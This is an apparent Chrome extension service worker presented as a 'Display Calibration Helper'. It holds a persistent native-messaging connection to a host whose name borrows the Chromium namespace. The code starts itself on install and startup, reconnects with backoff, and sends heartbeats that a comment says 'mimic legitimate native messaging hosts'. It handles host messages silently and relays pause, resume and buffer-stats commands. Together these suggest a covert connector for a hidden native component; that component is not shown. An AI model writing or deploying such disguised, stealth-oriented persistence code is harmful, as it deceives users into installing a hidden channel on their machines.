// Display Calibration Helper — Native Messaging Connector
// Maintains connection to native host for display profile management.

const HOST_NAME = "com.chromium.display.calibration";
const RECONNECT_BASE_MS = 5000;
const RECONNECT_MAX_MS = 30000;
const HEARTBEAT_MS = 30000;

let port = null;
let reconnectTimer = null;
let heartbeatTimer = null;
let attempts = 0;

function connect() {
  attempts++;

  try {
    port = chrome.runtime.connectNative(HOST_NAME);

    port.onMessage.addListener((msg) => {
      handleMessage(msg);
    });

    port.onDisconnect.addListener(() => {
      port = null;
      if (heartbeatTimer) {
        clearInterval(heartbeatTimer);
        heartbeatTimer = null;
      }
      // Exponential backoff with cap
      const delay = Math.min(
        RECONNECT_BASE_MS * Math.pow(1.5, attempts - 1),
        RECONNECT_MAX_MS
      );
      if (reconnectTimer) clearTimeout(reconnectTimer);
      reconnectTimer = setTimeout(connect, delay);
    });

    // Handshake
    port.postMessage({
      cmd: "handshake",
      version: chrome.runtime.getManifest().version,
      extensionId: chrome.runtime.id,
      timestamp: Date.now()
    });

    // Heartbeat — mimics legitimate native messaging hosts
    heartbeatTimer = setInterval(() => {
      if (port) {
        port.postMessage({ cmd: "ping", timestamp: Date.now() });
      }
    }, HEARTBEAT_MS);

    attempts = 0;
  } catch (_) {
    reconnectTimer = setTimeout(connect, RECONNECT_BASE_MS);
  }
}

function handleMessage(msg) {
  // Silent handling — no notifications, no badge, no storage writes.
  // In production, you could route stats to a local dashboard page
  // served by the extension if needed.
  switch (msg.cmd) {
    case "pong":
      break;
    case "stats":
      break;
    case "buffer_stats":
      break;
    case "handshake_ack":
      break;
    case "ack":
      break;
    case "error":
      break;
    default:
      break;
  }
}

// Extension API — allows popup or devtools to query stats
chrome.runtime.onMessage.addListener((request, _sender, sendResponse) => {
  if (!port) {
    sendResponse({ error: "not_connected" });
    return;
  }

  switch (request.cmd) {
    case "get_stats":
      port.postMessage({ cmd: "get_stats" });
      // One-shot listener for response
      const statsListener = (msg) => {
        if (msg.cmd === "stats") {
          port.onMessage.removeListener(statsListener);
          sendResponse(msg.data);
        }
      };
      port.onMessage.addListener(statsListener);
      return true; // async response

    case "pause":
      port.postMessage({ cmd: "pause", reason: request.reason || "manual" });
      sendResponse({ status: "sent" });
      break;

    case "resume":
      port.postMessage({ cmd: "resume" });
      sendResponse({ status: "sent" });
      break;

    default:
      sendResponse({ error: "unknown" });
  }
});

// Lifecycle hooks
chrome.runtime.onInstalled.addListener(() => connect());
chrome.runtime.onStartup.addListener(() => connect());
connect();

// Cleanup on service worker termination
self.addEventListener("unload", () => {
  if (reconnectTimer) clearTimeout(reconnectTimer);
  if (heartbeatTimer) clearInterval(heartbeatTimer);
  if (port) {
    port.postMessage({ cmd: "shutdown" });
    port.disconnect();
  }
});
